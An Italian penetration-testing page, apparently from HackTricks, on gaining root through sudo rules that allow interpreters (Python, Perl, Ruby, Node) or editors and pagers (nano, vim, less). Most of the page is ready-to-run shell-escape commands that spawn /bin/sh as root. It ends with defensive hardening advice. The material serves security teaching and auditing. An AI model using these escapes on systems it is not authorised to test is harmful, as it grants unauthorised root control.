# Abuso dei comandi Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpreters consentiti da Sudo

Se `sudo -l` consente a un utente di eseguire un interpreter come root, consideralo come code execution diretta. Gli interpreters sono progettati per eseguire codice arbitrario, quindi una regola che consente `python3`, `perl`, `ruby`, `lua`, `node` o binari simili equivale generalmente all'esecuzione di comandi come root, a meno che gli argomenti non siano rigorosamente limitati e validati.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Flusso di revisione comune: prima elenca i privilegi dell'utente, quindi esegui un'istruzione Python con l'opzione `-c` dell'interpreter.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Altri esempi di interpreti sono riportati di seguito; gli interpreti elencati documentano l'esecuzione di codice inline o le API per i processi figli.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Il percorso esatto è importante. Se la regola sudo consente `/usr/bin/python3`, utilizza quel percorso esatto durante la convalida.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editor consentiti da Sudo

Se `sudo -l` consente a un utente di eseguire un editor interattivo come root, trattalo come una superficie di command execution, non come un'innocua autorizzazione alla modifica dei file. Gli editor possono spesso eseguire comandi shell, leggere file arbitrari, scrivere file arbitrari o richiamare helper esterni dall'interno dell'editor.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Flusso di revisione comune: elenca i privilegi dell'utente, quindi avvia ogni editor o pager consentito tramite sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Esecuzione di comandi con Nano

Quando `nano` è consentito tramite sudo, l'esecuzione di comandi può essere raggiungibile dall'interfaccia dell'editor.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Quindi fornisci un comando come `id` o `/bin/sh` al prompt dei comandi di nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Se una shell interattiva non dispone di flussi del terminale utilizzabili, questa forma di redirezione mappa il suo output standard e gli errori al descrittore 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
La sequenza esatta di tasti può variare in base alla versione di nano e alle opzioni di compilazione, ma il problema di sicurezza è lo stesso: l'editor viene eseguito come root e può invocare comandi esterni.<sup>[[1]](#references)[[12]](#references)</sup>

### Altri escape comuni degli editor

Gli editor in stile Vim espongono comunemente l'esecuzione di comandi tramite `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
I pager come `less` possono anche consentire l'esecuzione di comandi shell.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Note difensive

- Evitare di concedere interpreter o editor interattivi tramite sudo.<sup>[[1]](#references)</sup>
- Preferire wrapper fissi, di proprietà di root, che eseguano una singola azione amministrativa specifica.<sup>[[1]](#references)[[2]](#references)</sup>
- Se un interpreter è inevitabile, limitare il percorso esatto dello script e impedire gli argomenti controllati dall'utente, gli import scrivibili, `PYTHONPATH` e la conservazione non sicura dell'ambiente.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Se è necessaria la modifica di file, limitare il percorso esatto del file e valutare l'uso di `sudoedit` con versioni di sudo aggiornate e una gestione rigorosa dell'ambiente.<sup>[[1]](#references)[[2]](#references)</sup>
- Esaminare `SETENV`, `env_keep`, le directory di lavoro scrivibili, i percorsi di moduli/import scrivibili, `NOEXEC`, `use_pty` e il logging, ma non considerarli una sandbox completa.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — pagina del manuale Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — pagina del manuale Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Riga di comando e ambiente — documentazione di Python](https://docs.python.org/3/using/cmdline.html)
- [4] [os — interfacce varie del sistema operativo — documentazione di Python](https://docs.python.org/3/library/os.html)
- [5] [perlrun — come eseguire l'interpreter Perl](https://perldoc.perl.org/perlrun)
- [6] [exec — documentazione di Perl](https://perldoc.perl.org/functions/exec)
- [7] [Opzioni della riga di comando di Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — documentazione di Ruby](https://ruby-doc.org/3.4/Kernel.html)
- [9] [API della riga di comando — documentazione di Node.js](https://nodejs.org/api/cli.html)
- [10] [Processo figlio — documentazione di Node.js](https://nodejs.org/api/child_process.html)
- [11] [Pagina del manuale di lua 5.4](https://www.lua.org/manual/5.4/lua.html)
- [12] [L'editor di testo GNU nano](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — pagina del manuale Linux](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirezioni — manuale di riferimento di Bash](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
